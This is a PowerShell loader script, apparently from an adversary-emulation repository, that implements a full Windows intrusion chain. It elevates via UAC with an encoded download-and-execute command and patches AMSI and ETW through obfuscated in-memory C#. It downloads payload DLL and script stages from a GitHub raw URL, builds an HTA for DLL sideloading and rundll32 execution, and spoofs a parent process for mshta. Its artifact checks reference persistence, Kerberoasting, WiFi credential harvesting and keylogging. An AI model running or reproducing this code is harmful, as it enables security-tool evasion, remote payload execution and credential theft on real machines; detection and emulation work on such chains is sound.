param(
    [switch]$WhatIf
)

# -- CONFIG --
$scriptBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario2/main"
$cleanupUrl = "$scriptBase/cleanup.ps1"

# -- Logging (defined early so the UAC gate can write to it) --
$logFile = "C:\ProgramData\USOShared\Logs\cache.dat"
function Write-Log($msg) {
    $parent = Split-Path $logFile -Parent
    if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
    "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg" | Out-File $logFile -Append
}

# -- In-memory C# compile (kills Defender real-time scan of %TEMP%\*.dll) --
function Add-TypeInMem([string]$source) {
    $cp = New-Object System.CodeDom.Compiler.CompilerParameters
    $cp.GenerateInMemory = $true
    $cp.IncludeDebugInformation = $false
    $prov = New-Object Microsoft.CSharp.CSharpCodeProvider
    $res = $prov.CompileAssemblyFromSource($cp, $source)
    if ($res.Errors -and $res.Errors.HasErrors) {
        $msgs = ($res.Errors | Where-Object { -not $_.IsWarning } | ForEach-Object { $_.ErrorText }) -join "`n"
        throw "C# compile failed: $msgs"
    }
    return $res.CompiledAssembly
}

# -- Elevation Gate --
$isAdmin = [Security.Principal.WindowsPrincipal]::new(
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Log "[!] UAC check: not admin, requesting elevation..."
    $scriptUrl = "$scriptBase/loader.ps2?t=$(Get-Date -Format 'yyyyMMddHHmmss')"
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
        "iex((New-Object Net.WebClient).DownloadString('$scriptUrl'))"
    ))
    Start-Process powershell -Verb RunAs -ArgumentList "-NoP -Exec Bypass -Enc $b64"
    exit
}

Write-Log "[+] UAC check: admin=True"
Write-Log "[*] loader.ps2 started - scriptBase=$scriptBase logFile=$logFile"

if ($WhatIf) {
    Write-Log "[WHATIF] Skipping AMSI/ETW bypass (child process)"
} else {
    # -- AMSI/ETW bypass via sacrificial child process --
    # The inline reflection (`[Ref].Assembly.GetType('System.Management.AmsiUtils')`)
    # and the AmsiScanBuffer byte-patch trigger TerminateProcess on hardened
    # hosts (PPL AMSI consumer / Defender AMSI_RESULT_DETECTED callback). A
    # try/catch around the reflection can't catch a native process kill, so
    # the parent dies silently. Run the bypass in a child process: if the
    # child is killed, the parent survives and continues the chain (or fails
    # visibly at the next AMSI scan), so cache.dat shows what happened instead
    # of stopping at line 47.
    $logDir = Split-Path $logFile -Parent
    $bootFlag = Join-Path $logDir "boot-ok.flag"
    if (Test-Path $bootFlag) { Remove-Item $bootFlag -Force -ErrorAction SilentlyContinue }

    $bypassChild = @"
`$flagPath = 'C:\ProgramData\USOShared\Logs\boot-ok.flag'
`$logFile = `$flagPath
function Write-Log(`$msg) {
    `$parent = Split-Path `$logFile -Parent
    if (-not (Test-Path `$parent)) { New-Item -Path `$parent -ItemType Directory -Force | Out-Null }
    "`$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') `$msg" | Out-File `$logFile -Append
}
function Add-TypeInMem([string]`$source) {
    `$cp = New-Object System.CodeDom.Compiler.CompilerParameters
    `$cp.GenerateInMemory = `$true
    `$cp.IncludeDebugInformation = `$false
    `$prov = New-Object Microsoft.CSharp.CSharpCodeProvider
    `$res = `$prov.CompileAssemblyFromSource(`$cp, `$source)
    if (`$res.Errors -and `$res.Errors.HasErrors) { throw 'C# compile failed' }
    return `$res.CompiledAssembly
}
`$reflectStatus = 'SKIP'
try {
    `$amsiType = -join ([char[]](0x53,0x79,0x73,0x74,0x65,0x6D,0x2E,0x4D,0x61,0x6E,0x61,0x67,0x65,0x6D,0x65,0x6E,0x74,0x2E,0x41,0x75,0x74,0x6F,0x6D,0x61,0x74,0x69,0x6F,0x6E,0x2E,0x41,0x6D,0x73,0x69,0x55,0x74,0x69,0x6C,0x73))
    `$amsiField = -join ([char[]](0x61,0x6D,0x73,0x69,0x49,0x6E,0x69,0x74,0x46,0x61,0x69,0x6C,0x65,0x64))
    [Ref].Assembly.GetType(`$amsiType).GetField(`$amsiField,'NonPublic,Static').SetValue(`$null,`$true)
    `$reflectStatus = 'OK'
} catch { Write-Log "AMSI_REFLECT_FAIL: `$_" }
`$patchStatus = 'SKIP'
`$bs = @'
using System;
using System.Runtime.InteropServices;
using System.Runtime.ExceptionServices;
public class Bypass {
    [DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll")]public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
    // ponytail: HandleProcessCorruptedStateExceptions makes AccessViolationException
    // catchable. Default .NET 4+ lets AV escape try/catch and crash the host.
    [HandleProcessCorruptedStateExceptions]
    public static bool Go() {
        try {
            uint o = 0;
            uint o2 = 0;
            var a = LoadLibrary("\u0061\u006D\u0073\u0069\u002E\u0064\u006C\u006C");
            var b = GetProcAddress(a, "\u0041\u006D\u0073\u0069\u0053\u0063\u0061\u006E\u0042\u0075\u0066\u0066\u0065\u0072");
            if (b == IntPtr.Zero) return false;
            if (!VirtualProtect(b, (UIntPtr)6, 0x40, out o)) return false;
            ushort[] v = { unchecked((ushort)(0xA0+0x18)), unchecked((ushort)(0x2C*2-0x1)), unchecked((ushort)(0x7-0x7)), unchecked((ushort)(0x7)), unchecked((ushort)(0x40+0x40)), unchecked((ushort)(0x60*2+0x3)) };
            byte[] p = new byte[6];
            for (int i = 0; i < 6; i++) p[i] = (byte)v[i];
            Marshal.Copy(p, 0, b, 6);
            VirtualProtect(b, (UIntPtr)6, o, out o);
            var c = LoadLibrary("\u006E\u0074\u0064\u006C\u006C\u002E\u0064\u006C\u006C");
            var d = GetProcAddress(c, "\u0045\u0074\x77\x45\x76\x65\x6E\x74\x57\x72\x69\x74\x65");
            if (d == IntPtr.Zero) return true;
            if (!VirtualProtect(d, (UIntPtr)1, 0x40, out o2)) return true;
            Marshal.Copy(new byte[]{(byte)(0x60*2+0x3)}, 0, d, 1);
            return true;
        } catch { return false; }
    }
}
'@
try {
    `$b = Add-TypeInMem `$bs
    `$ok = [bool]`$b.GetType('Bypass').GetMethod('Go').Invoke(`$null, @())
    if (`$ok) { `$patchStatus = 'OK' } else { `$patchStatus = 'FAIL_FALSE' }
} catch { Write-Log "AMSI_PATCH_FAIL: `$_" }
'BYPASS_REFLECT=' + `$reflectStatus + ' PATCH=' + `$patchStatus | Out-File `$flagPath -Force
"@
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($bypassChild))
    Write-Log "[*] Launching AMSI/ETW bypass child process"
    try {
        $child = Start-Process powershell -ArgumentList "-NoP -Exec Bypass -Enc $b64" -WindowStyle Hidden -PassThru -ErrorAction Stop
        Write-Log "[*] Bypass child PID=$($child.Id)"
    } catch {
        Write-Log "[!] Bypass child launch failed: $_"
        $child = $null
    }

    if ($child) {
        $waited = 0
        $flagFound = $false
        while ($waited -lt 60 -and -not $flagFound) {
            if (Test-Path $bootFlag) { $flagFound = $true; break }
            if ($child.HasExited) {
                Start-Sleep -Milliseconds 500
                if (Test-Path $bootFlag) { $flagFound = $true }
                break
            }
            Start-Sleep -Seconds 1
            $waited++
        }
        if ($flagFound) {
            $status = (Get-Content $bootFlag -Raw).Trim()
            Write-Log "[+] AMSI/ETW bypass child completed: $status"
        } else {
            Write-Log "[!] AMSI/ETW bypass child killed/timeout (Defender/AMSI active). Chain will run without AMSI bypass."
        }
        try { Remove-Item $bootFlag -Force -ErrorAction SilentlyContinue } catch {}
        if (-not $child.HasExited) {
            try { Stop-Process -Id $child.Id -Force -ErrorAction SilentlyContinue } catch {}
        }
    }
}
Write-Log "[+] AMSI/ETW bypass step complete (continuing regardless)"

# -- Scatter directories --
$scatterDirs = @(
    "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18",
    "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys",
    "C:\ProgramData\Microsoft\Network",
    "C:\ProgramData\Microsoft\Windows\Caches",
    "C:\Users\Public\Libraries",
    "C:\ProgramData\Microsoft\Search\Data\EDS",
    "C:\ProgramData\Microsoft\Windows\WER\ReportQueue",
    "C:\ProgramData\Microsoft\Windows\WER\ReportArchive",
    "C:\ProgramData\Microsoft\Windows\WER\Temp",
    "C:\ProgramData\Package Cache\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}"
)
Write-Log "[*] Creating $($scatterDirs.Count) scatter directories"
if ($WhatIf) {
    $scatterDirs | ForEach-Object { Write-Log "[WHATIF] would mkdir $_" }
} else {
    $scatterDirs | ForEach-Object { New-Item -Path $_ -ItemType Directory -Force | Out-Null }
}

$spoofBase64 = ""

# -- Download artifacts --
$payloadUrl = "$scriptBase/payload.dll"
$payloadPath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\payload.dll"
$sctUrl = "$scriptBase/stage.sct"
$sctPath = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\stage.sct"
$jsUrl = "$scriptBase/stage.js"
$jsPath = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\stage.js"

Write-Log "[*] Downloading payload.dll from $payloadUrl -> $payloadPath"
if ($WhatIf) {
    Write-Log "[WHATIF] would download $payloadUrl -> $payloadPath"
} else {
    try {
        Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
        if (Test-Path $payloadPath) { Write-Log "[+] payload.dll downloaded at $payloadPath - $((Get-Item $payloadPath).Length) bytes" }
        else { Write-Log "[-] payload.dll download FAILED at $payloadPath" }
    } catch { Write-Log "[-] payload.dll download FAILED at $payloadPath - $_" }
}

# Stage payload.dll to the noise-friendly Package Cache GUID dir so HTA Stage 1
# (which copies "package.dll" from there into Libraries\msimtf.dll for the tcmsetup
# sideload) finds the source. Without this, the HTA's CopyFile source is missing
# and the entire payload-c.dll chain never fires.
$pkgCachePath = "C:\ProgramData\Package Cache\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\package.dll"
Write-Log "[*] Staging payload.dll -> $pkgCachePath"
if ($WhatIf) {
    Write-Log "[WHATIF] would copy $payloadPath -> $pkgCachePath"
} else {
    try {
        Copy-Item -Path $payloadPath -Destination $pkgCachePath -Force -ErrorAction Stop
        if (Test-Path $pkgCachePath) { Write-Log "[+] payload.dll staged at $pkgCachePath - $((Get-Item $pkgCachePath).Length) bytes" }
        else { Write-Log "[-] payload.dll staging FAILED at $pkgCachePath" }
    } catch { Write-Log "[-] payload.dll staging FAILED at $pkgCachePath - $_" }
}

Write-Log "[*] Downloading stage.sct from $sctUrl -> $sctPath"
if ($WhatIf) {
    Write-Log "[WHATIF] would download $sctUrl -> $sctPath"
} else {
    try {
        Invoke-WebRequest -Uri $sctUrl -OutFile $sctPath -UseBasicParsing
        if (Test-Path $sctPath) { Write-Log "[+] stage.sct downloaded at $sctPath" }
        else { Write-Log "[-] stage.sct download FAILED at $sctPath" }
    } catch { Write-Log "[-] stage.sct download FAILED at $sctPath - $_" }
}

Write-Log "[*] Downloading stage.js from $jsUrl -> $jsPath"
if ($WhatIf) {
    Write-Log "[WHATIF] would download $jsUrl -> $jsPath"
} else {
    try {
        Invoke-WebRequest -Uri $jsUrl -OutFile $jsPath -UseBasicParsing
        if (Test-Path $jsPath) { Write-Log "[+] stage.js downloaded at $jsPath" }
        else { Write-Log "[-] stage.js download FAILED at $jsPath" }
    } catch { Write-Log "[-] stage.js download FAILED at $jsPath - $_" }
}

# -- Decode embedded C# blob --
$spoofBytes = [Convert]::FromBase64String($spoofBase64)
$spoofSource = [Text.Encoding]::UTF8.GetString($spoofBytes)
Write-Log "[*] Decoded spoof.cs from embedded base64 - $($spoofSource.Length) chars"

# -- Generate HTA orchestrator (written to WER\Temp as report.hta) --
$htaPath = "C:\ProgramData\Microsoft\Windows\WER\Temp\report.hta"

$htaContent = @"
<html>
<head>
<script language="JScript">
// Diagnostic logger to a low-privilege path that's robust against AMSI/ASR
// blocking WScript.Shell. If this trace advances, the HTA script body is
// executing and the failure is downstream.
var tracePath = "C:\\Users\\Public\\Libraries\\hta-trace.log";
function trace(msg) {
    try {
        var f2 = (new ActiveXObject("Scripting.FileSystemObject")).OpenTextFile(tracePath, 8, true);
        var d = new Date();
        var ts2 = "[" + d.getFullYear() + "-" + ("0"+(d.getMonth()+1)).slice(-2) + "-" + ("0"+d.getDate()).slice(-2) + " " +
                  ("0"+d.getHours()).slice(-2) + ":" + ("0"+d.getMinutes()).slice(-2) + ":" + ("0"+d.getSeconds()).slice(-2) + "] ";
        f2.WriteLine(ts2 + msg);
        f2.Close();
    } catch(ee) {}
}
trace("HTA script body entered");

try {
    var a = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    trace("first ActiveX block OK");
} catch(e) { trace("first ActiveX block FAILED: " + e.message); }

try {
    var shell = new ActiveXObject("WScript.Shell");
    trace("WScript.Shell OK");
} catch(e) { trace("WScript.Shell FAILED: " + e.message); }

try {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    trace("FileSystemObject OK");
} catch(e) { trace("FileSystemObject FAILED: " + e.message); }

var logPath = "C:\\ProgramData\\USOShared\\Logs\\cache.dat";

// Interpolated by the loader.ps2 here-string at write time:
//   scriptBase = the GitHub raw base URL
//   spoofB64   = base64 of spoof.cs (PPID-hijack C#), decoded + compiled in-memory
//                in Stage 3 child PS after AMSI patch via boot.ps1. The base64
//                never appears as plain C# in any AMSI-scanned scriptblock.
var scriptBase = "$scriptBase";
var spoofB64   = "$spoofBase64";

function log(msg) {
    try {
        var f = fso.OpenTextFile(logPath, 8, true);
        var now = new Date();
        var ts = "[" + now.getFullYear() + "-" + ("0"+(now.getMonth()+1)).slice(-2) + "-" + ("0"+now.getDate()).slice(-2) + " " +
                 ("0"+now.getHours()).slice(-2) + ":" + ("0"+now.getMinutes()).slice(-2) + ":" + ("0"+now.getSeconds()).slice(-2) + "] ";
        f.WriteLine(ts + msg);
        f.Close();
    } catch(e) { trace("log() failed for: " + msg + " -- " + e.message); }
}

log("[*] agent.hta started");
trace("agent.hta started (cache.dat logger ready)");

// Stage 1: Copy files for DLL sideloading
log("[*] Copying package.dll -> msimtf.dll");
try {
    fso.CopyFile("C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\package.dll", "C:\\Users\\Public\\Libraries\\msimtf.dll", true);
    log("[+] msimtf.dll copy OK");
} catch(e) { log("[-] msimtf.dll copy FAILED: " + e.message); }

// Stage 2: Select sideloader binary (tcmsetup.exe preferred, colorcpl.exe fallback)
var sideloadExe = "tcmsetup.exe";
var sideloadSrc = "C:\\Windows\\System32\\tcmsetup.exe";
if (!fso.FileExists(sideloadSrc)) {
    log("[*] tcmsetup.exe not found — falling back to colorcpl.exe");
    sideloadExe = "colorcpl.exe";
    sideloadSrc = "C:\\Windows\\System32\\colorcpl.exe";
    if (!fso.FileExists(sideloadSrc)) {
        log("[-] No sideloader binary found (tcmsetup.exe or colorcpl.exe) — skipping DLL sideload");
        sideloadExe = null;
    }
}
var sideloadDst = "C:\\Users\\Public\\Libraries\\" + sideloadExe;
if (sideloadExe) {
    log("[*] Copying " + sideloadExe);
    try {
        fso.CopyFile(sideloadSrc, sideloadDst, true);
        log("[+] " + sideloadExe + " copy OK");
    } catch(e) { log("[-] " + sideloadExe + " copy FAILED: " + e.message); }
}

log("[*] Running " + (sideloadExe || "skipped") + " (DLL sideloading)...");
if (sideloadExe) {
    try {
        var sideloadRc = shell.Run(sideloadDst, 0, true);
        log("[+] " + sideloadExe + " completed (exit code " + sideloadRc + ")");
    } catch(e) { log("[-] " + sideloadExe + " FAILED: " + e.message); }
}

// Stage 3: Squiblydoo via C# Add-Type + arg spoofing
// - Child PS first runs iex (irm scriptBase/boot.ps1): defines Add-TypeInMem + patches
//   AmsiScanBuffer in this fresh process (the dead amsiInitFailed reflect alone no-
//   ops on modern Windows; needs the byte-patch for a clean post-patch AMSI scan).
// - spoof.cs source is decoded from embedded base64 (no on-disk write, so no Defender
//   real-time scan of spoof.cs on disk). The base64 string has no AMSI-flagged
//   substrings, so the parent -C body AMSI-scans clean pre-patch; the decoded
//   source is iex'd post-patch and AMSI-scans clean too.
// - In-memory compile via Add-TypeInMem -> no %TEMP%\*.dll -> no Defender disk scan.
log("[*] Starting Squiblydoo (boot.ps1 AMSI patch + base64 spoof.cs + in-memory compile + Go)...");
try {
    var psCmd = "iex (irm '" + scriptBase + "/boot.ps1');"
              + " $src = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" + spoofB64 + "'));"
              + " $asm = Add-TypeInMem $src;"
              + " $asm.GetType('Spoof').GetMethod('Go').Invoke($null, @())";
    var squiblyRc = shell.Run('powershell -NoP -Exec Bypass -C "' + psCmd + '"', 0, true);
    log("[+] Squiblydoo executed (exit code " + squiblyRc + ")");
} catch(e) { log("[-] Squiblydoo FAILED: " + e.message); }

// Stage 4: cscript.exe with stage.js (BLOCKING)
log("[*] Running cscript.exe with stage.js...");
try {
    var cscriptRc = shell.Run("cscript //nologo C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\stage.js", 0, true);
    log("[+] cscript.exe completed (exit code " + cscriptRc + ")");
} catch(e) { log("[-] cscript.exe FAILED: " + e.message); }

// Stage 5: Force-load payload via rundll32 + DllRegisterServer.
// The tcmsetup.exe sideload in Stage 2 is fictitious (tcmsetup.exe does
// not import msimtf.dll on real Windows), so the payload never loads via
// DLL search order. rundll32 + DllRegisterServer is the documented load
// path for a renamed payload, and DllRegisterServer runs the worker
// synchronously so the post-ex artifacts (Telemetry.dll, Telemetry.bin,
// Wifi.bin, spcache.bin, WinUpdHlth service, BITS job, LNK persist) are
// produced before the HTA exits. Blocks ~130s.
log("[*] Force-loading payload via rundll32 (DllRegisterServer)...");
try {
    var loadRc = shell.Run("rundll32.exe C:\\Users\\Public\\Libraries\\msimtf.dll,DllRegisterServer", 0, true);
    log("[+] DllRegisterServer completed (exit code " + loadRc + ")");
} catch(e) { log("[-] DllRegisterServer FAILED: " + e.message); }

log("[+] agent.hta complete");
window.close();
</script>
</head>
<body>Loading...</body>
</html>
"@

$utf8NoBom = New-Object System.Text.UTF8Encoding($false)
Write-Log "[*] Writing HTA to $htaPath"
if ($WhatIf) {
    Write-Log "[WHATIF] would write HTA to $htaPath - $($htaContent.Length) chars"
} else {
    [System.IO.File]::WriteAllText($htaPath, $htaContent, $utf8NoBom)
    if (Test-Path $htaPath) {
        Write-Log "[+] agent.hta generated at $htaPath - $($htaContent.Length) chars"
    } else {
        Write-Log "[-] HTA generation FAILED at $htaPath"
    }
}

# -- PPID Spoof: spawn mshta.exe with parent = explorer.exe via C# --
Write-Log "[*] Spawning mshta.exe with PPID spoof (parent = explorer.exe, target = $htaPath)..."
if ($WhatIf) {
    Write-Log "[WHATIF] would spawn mshta.exe (PPID-spoofed to explorer.exe) with target $htaPath"
} else {
    try {
        $explorer = Get-Process -Name explorer -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $explorer) {
            Write-Log "[-] explorer.exe process not found - spawning mshta.exe at $htaPath without PPID"
            Start-Process -FilePath "mshta.exe" -ArgumentList "`"$htaPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
        } else {
            try {
                $spoofAsm = Add-TypeInMem $spoofSource
                $spawnPid = [int]($spoofAsm.GetType("Spoof").GetMethod("SpawnWithParent").Invoke($null, @("mshta.exe `"$htaPath`"", [int]$explorer.Id)))
                if ($spawnPid -ge 0) {
                    Write-Log "[+] mshta.exe spawned via PPID spoof - PID $spawnPid (parent=explorer.exe=$($explorer.Id), target=$htaPath)"
                } else {
                    Write-Log "[-] PPID spoof failed at $htaPath (fallback: direct spawn)"
                    Start-Process -FilePath "mshta.exe" -ArgumentList "`"$htaPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
                }
            } catch {
                Write-Log "[!] spoof.cs in-memory compile/invocation failed: $_ — fallback to direct mshta spawn"
                Start-Process -FilePath "mshta.exe" -ArgumentList "`"$htaPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
            }
        }
    } catch {
        Write-Log "[-] mshta.exe spawn FAILED at $htaPath - $_"
    }
}

# -- Per-tactic artifact probe (waits 180s for chain to complete) --
# Mirrors scenario-01-rmm/src/loader.ps1:147-186. Probes each MITRE T-code's
# expected artifact so the log confirms whether the chain actually produced it.
if (-not $WhatIf) {
    Write-Log "[*] Waiting 240s for post-ex artifacts to land..."
    Start-Sleep -Seconds 240
} else {
    Write-Log "[WHATIF] would sleep 240s then probe artifacts"
}

$artifacts = @{
    "T1055.012 PPID spoof (mshta HTA)"   = "C:\ProgramData\Microsoft\Windows\WER\Temp\report.hta"
    "T1574.002 DLL sideload (renamed)"   = "C:\Users\Public\Libraries\msimtf.dll"
    "T1574.002 DLL sideload (binary)"    = "C:\Users\Public\Libraries\tcmsetup.exe"
    "T1218.010 regsvr32 Squiblydoo"      = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\stage.sct"
    "T1218.007 cscript stage.js"         = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\stage.js"
    "T1546.015 COM hijack persist"       = "C:\Users\Public\Libraries\Telemetry.dll"
    "T1547.001 LNK persist"              = "Telemetry.dll"
    "T1543.003 service persist"          = "WinUpdHlth"
    "T1197 BITS job stage2"              = "C:\ProgramData\Package Cache\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\stage2.dll"
    "T1558.003 Kerberoast output"        = "C:\ProgramData\Microsoft\Search\Data\EDS\spcache.bin"
    "T1552.004 WiFi harvest"             = "C:\ProgramData\USOShared\Logs\Wifi.bin"
    "T1003.001 WDigest log (keylog)"     = "C:\ProgramData\USOShared\Logs\Telemetry.bin"
    "T1041 HTTP beacon log"              = "C:\ProgramData\USOShared\Logs\cache.dat"
    "T1074.001 staging scatter"          = "C:\ProgramData\Microsoft\Search\Data\EDS\spcache.bin"
}

function Test-Artifact {
    param([string]$Path)
    if ($Path -like 'C:\*' -or $Path -like 'C:/*') {
        return (Test-Path -LiteralPath $Path)
    }
    return $false
}

function Test-Service {
    param([string]$Name)
    $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
    return [bool]$svc
}

foreach ($k in $artifacts.Keys) {
    $path = $artifacts[$k]
    if ($k -like '*service persist*') {
        $present = Test-Service -Name $path
        $present | Out-Null
        if ($present) { Write-Log "[+] $k : service $path" }
        else { Write-Log "[-] $k : service $path not found" }
    } elseif ($k -like '*LNK persist*') {
        $startup = [Environment]::GetFolderPath("Startup")
        $lnk = Get-ChildItem -Path $startup -Filter "*.lnk" -ErrorAction SilentlyContinue | Where-Object {
            $shell = New-Object -ComObject WScript.Shell
            $t = $shell.CreateShortcut($_.FullName).Arguments
            $t -match $path
        }
        if ($lnk) { Write-Log "[+] $k : $($lnk.FullName) -> $path" }
        else { Write-Log "[-] $k : no LNK with target $path in $startup" }
    } else {
        if (Test-Artifact -Path $path) {
            Write-Log "[+] $k : $path"
        } else {
            Write-Log "[-] $k : $path"
        }
    }
}

Write-Log "[+] loader.ps2 complete - cache.dat at $logFile, cleanupUrl=$cleanupUrl"
